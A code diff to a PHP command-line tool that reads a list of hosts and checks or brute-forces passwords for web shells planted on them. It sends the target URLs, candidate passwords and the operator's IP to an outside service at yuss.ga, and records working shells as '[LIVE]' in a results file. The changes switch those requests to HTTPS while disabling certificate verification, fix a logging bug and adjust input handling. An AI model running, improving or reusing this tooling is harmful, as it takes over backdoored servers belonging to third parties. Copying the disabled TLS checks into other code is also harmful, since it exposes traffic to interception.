@@ -31,7 +31,9 @@ $list = trim(fgets(STDIN));
 function crotz($x)
 {
     $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, "http://yuss.ga/apiberingas.php");
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch, CURLOPT_URL, "https://yuss.ga/apiberingas.php");
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, "url=" . $x);
@@ -82,14 +84,21 @@ function crotz($x)
                         fwrite($end, "\n[DIE] Shell at ".$x." password : ".$key);
                         print "[".date('H:m:s')."] [DIE] Shell at ".$x." can't matching the password with ".$key."\n";
                         fclose($end);
+                    } else if($results->status == "error" && empty($key))
+                    {
+                        $end = fopen("shell_die.txt", "a+");
+                        fwrite($end, "\n[DIE] Shell at " . $x);
+                        fclose($end);
                     }
                     }
                 }
             }  else if(!strpos($pass, ".txt"))
             {
-                    if(!empty($pass))
-                    {
-                    curl_setopt($ch, CURLOPT_URL, "http://yuss.ga/bruteberingas.php");
+                if(!empty($pass))
+                {
+                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+                    curl_setopt($ch, CURLOPT_URL, "https://yuss.ga/bruteberingas.php");
                     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                     curl_setopt($ch, CURLOPT_POST, 1);
                     curl_setopt($ch, CURLOPT_POSTFIELDS, "url=" . $x . "&pass=" . $pass . "&ip=" . exec("curl -s ifconfig.me"));
@@ -99,17 +108,17 @@ function crotz($x)
                     if($results->status == "success")
                     {
                         $end = fopen("shell_result.txt", "a+");
-                        fwrite($end, "\n[LIVE] Shell at ".$x." password : ".$passy);
+                        fwrite($end, "\n[LIVE] Shell at ".$x." password : ".$pass);
                         print "\n[".date('H:m:s')."] [LIVE] Shell at ".$x."\n is ok with ".$pass."\n\n";
                         fclose($end);
                     } else if($results->status == "error")
                     {
                         $end = fopen("shell_die.txt", "a+");
-                        fwrite($end, "\n[DIE] Shell at ".$x." password : ".$pass);
+                        fwrite($end, "\n[DIE] Shell at " . $x);
                         print "[".date('H:m:s')."] [DIE] Shell at ".$x." can't matching the password with ".$pass."\n";
                         fclose($end);
                     }
-                    }
+                }
             }
         }
     } else if(($result->Status == "success") && $ex[0] == "Uploader")
@@ -151,7 +160,7 @@ if(strpos($list, ".txt"))
             crotz($host);
         }
     }
-} else if(strpos($list, "|"))
+} else if(strpos($list, "|") && !strpos($list, ".txt"))
 {
     $explode = explode("|", $list);
 
